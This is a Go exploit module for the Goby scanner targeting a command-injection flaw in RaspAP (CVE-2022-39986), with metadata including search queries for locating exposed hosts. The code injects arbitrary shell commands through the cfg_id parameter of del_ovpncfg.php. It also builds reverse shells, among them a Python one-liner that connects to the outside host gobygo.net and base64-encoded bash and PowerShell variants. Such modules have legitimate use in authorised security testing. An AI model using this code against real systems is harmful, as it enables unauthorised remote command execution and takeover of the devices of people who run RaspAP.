package exploits

import (
	"encoding/base64"
	"errors"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"
  "regexp"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "RaspAP /del_ovpncfg.php  Command Execution Vulnerability(CVE-2022–39986)",
    "Description": "<p>RaspAP is a software solution that can easily deploy a Raspberry Pi as an Access Point (AP) with a set of responsive WebUI to control WiFi, which is as convenient as a home router. </p><p>RaspAP has a command execution vulnerability, which allows an attacker to execute arbitrary commands on the target server.</p>",
    "Product": "RaspAP",
    "Homepage": "https://raspap.com/",
    "DisclosureDate": "2022-09-22",
    "PostTime": "2024-09-24",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "(header=\"RaspAP\" || banner=\"RaspAP\") && (header=\"401 Unauthorized\" || banner=\"401 Unauthorized\")",
    "GobyQuery": "(header=\"RaspAP\" || banner=\"RaspAP\") && (header=\"401 Unauthorized\" || banner=\"401 Unauthorized\")",
    "Level": "2",
    "Impact": "<p>RaspAP has a command execution vulnerability, which allows an attacker to execute arbitrary commands on the target server.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://medium.com/@ismael0x00/multiple-vulnerabilities-in-raspap-3c35e78809f2"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByBashBase64,ByNcBsd",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "2H1W"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2022–39986"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "RaspAP /del_ovpncfg.php 命令执行漏洞（CVE-2022–39986）",
            "Product": "RaspAP",
            "Description": "<p>RaspAP是一个可以将树莓派轻松部署成无线AP（Access Point）的软件方案，具有一套响应式的WebUI 来控制WiFi，用起来和家用路由器一样方便。</p><p>RaspAP存在命令执行漏洞，攻击者可以在目标服务器上执行任意命令。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>RaspAP存在命令执行漏洞，攻击者可以在目标服务器上执行任意命令。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "RaspAP /del_ovpncfg.php  Command Execution Vulnerability(CVE-2022–39986)",
            "Product": "RaspAP",
            "Description": "<p>RaspAP is a software solution that can easily deploy a Raspberry Pi as an Access Point (AP) with a set of responsive WebUI to control WiFi, which is as convenient as a home router.&nbsp;</p><p>RaspAP has a command execution vulnerability, which allows an attacker to execute arbitrary commands on the target server.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>RaspAP has a command execution vulnerability, which allows an attacker to execute arbitrary commands on the target server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9956"
}`
setPayloadRequestHashasdagyhusydgagushctqasfgurtdasfdasfxdfas := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//请注意：command字段是原始的命令，如果漏洞利用需要对命令进行编码，则需在此处编码

		//请注意：ok值为，true代表命令执行成功，false代表命令执行失败

		//请注意：vulURL 字段为检测后显示的风险路径，示例值为：/path/to/vulable.jsp
		vulURL := "/ajax/openvpn/del_ovpncfg.php"

		requestConfig := httpclient.NewPostRequestConfig(vulURL)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Timeout = 10
    requestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
    //command进行url编码
    command = url.QueryEscape(command)
    requestConfig.Data = "cfg_id=;"+command+";"
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to RCE")
			return "", vulURL, err
		}
		commandResult := ""
		//正则匹配
		re, err := regexp.Compile(`{"return":\["((.|\n)*?)"\]}`)
		//检查是否有匹配到内容
		if !re.MatchString(resp.RawBody) {
			return "", vulURL, errors.New("failed to RCE")
		}
		match := re.FindStringSubmatch(resp.RawBody)
		commandResult = match[1]
		return commandResult, vulURL, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashasdagyhusydgagushctqasfgurtdasfdasfxdfas

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashasdagyhusydgagushctqasfgurtdasfdasfxdfas

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				bypython := func(port string) string {
					return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"gobygo.net\"," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
				}
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"Bypython":           bypython,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
 
				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
